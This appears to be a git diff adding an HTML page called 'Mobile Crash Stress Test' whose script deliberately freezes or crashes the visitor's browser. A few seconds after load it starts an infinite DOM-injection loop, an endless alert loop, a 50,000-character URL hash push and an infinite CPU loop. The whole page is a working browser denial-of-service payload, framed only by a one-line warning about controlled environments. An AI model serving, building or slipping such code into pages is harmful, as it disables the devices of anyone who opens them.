@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mobile Crash Stress Test</title>
+  <style>
+    body {
+      background: black;
+      color: white;
+      font-family: monospace;
+    }
+  </style>
+</head>
+<body>
+  <h1>⚠️ Mobile Crash Stress Test ⚠️</h1>
+  <p>This page will attempt to freeze or crash your browser. Use only in a controlled environment.</p>
+  <script>
+    // Infinite DOM Injection (DOM Bomb)
+    setTimeout(() => {
+      let div = document.createElement("div");
+      while (true) {
+        let d = div.cloneNode();
+        d.innerText = "💥";
+        document.body.appendChild(d);
+      }
+    }, 1000); // delay to allow page load
+
+    // Infinite Alerts (Dialog Bomb)
+    setTimeout(() => {
+      while (true) {
+        alert("💣 Boom!");
+      }
+    }, 2000);
+
+    // Fragment Bomb (force re-rendering)
+    setTimeout(() => {
+      let longHash = "#" + "A".repeat(50000);
+      history.pushState({}, "", longHash);
+    }, 3000);
+
+    // CPU Loop (100% usage)
+    setTimeout(() => {
+      while (true) {
+        Math.sqrt(Math.random() * Date.now());
+      }
+    }, 4000);
+  </script>
+</body>
+</html>
